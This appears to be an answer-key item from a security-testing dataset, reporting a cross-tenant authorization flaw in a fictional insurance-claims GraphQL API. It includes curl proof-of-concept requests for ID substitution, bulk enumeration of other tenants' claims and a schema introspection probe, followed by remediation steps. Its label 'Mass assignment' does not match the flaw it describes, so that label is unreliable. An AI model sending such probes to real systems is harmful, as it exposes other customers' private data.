# Expected Response

## System
- Domain: Insurance / Claims Processing
- System: ClaimsFlow Underwriting API
- Example ID: GQL-0362

## Priority Findings

### Finding 1: GraphQL BOLA — Mass assignment via object fields (Pattern 1.12)
**Severity:** Critical
**Category:** BOLA

**Summary:**
The GraphQL API at `POST /graphql` contains a Pattern 1.12 (Mass assignment via object fields) vulnerability.
An authenticated user belonging to `tenant-f3b5` can access or manipulate objects owned by
`tenant-32f3` by supplying a cross-tenant `claimId` in the GraphQL query/mutation.

**Evidence from HAR:**
- Request JWT claim `tenantId`: `tenant-f3b5`
- Response body `tenantId`: `tenant-32f3` — **mismatch confirms cross-tenant data access**
- Response HTTP status: `200 OK` — no authorization error raised by the resolver
- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-32f3`

**Root Cause:**
The resolver fetches the claim by `claimId` directly from the database without joining
against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
`tenantId` claim is never used as a WHERE clause predicate.

## Steps to Reproduce

### Step 1 — Establish attacker baseline
```bash
curl -s -X POST https://api.claimsflow-underwrit.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-F3B5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getClaim(id: \"C-1362\") { claimId tenantId ownerId data { sensitiveField } } }"}' 
```
**Expected baseline:** Returns `tenantId: "tenant-f3b5"` — this is the attacker's own object.

### Step 2 — Cross-tenant ID substitution
```bash
curl -s -X POST https://api.claimsflow-underwrit.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-F3B5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getClaim(id: \"C-2362\") { claimId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
```
**Vulnerable outcome:** Returns `tenantId: "tenant-32f3"` and full `sensitiveField` — **BOLA confirmed**.
**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.

### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
```bash
curl -s -X POST https://api.claimsflow-underwrit.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-F3B5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { bulkClaimLookup(ids: [\"C-2362\", \"C-3362\", \"C-4362\"]) { claimId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns objects from multiple tenants in a single response.

### Step 4 — Introspection probe (if Pattern 6.1 also present)
```bash
curl -s -X POST https://api.claimsflow-underwrit.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-F3B5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
```
**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.

## Secure Outcome Verification
For **Step 2**, the secure implementation MUST return:
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getClaim": null } }
```

## Remediation
1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE claimId = $id AND tenant_id = $jwtTenantId`.
2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
3. **Per-ID ownership filter for bulk operations:** In `bulkClaimLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
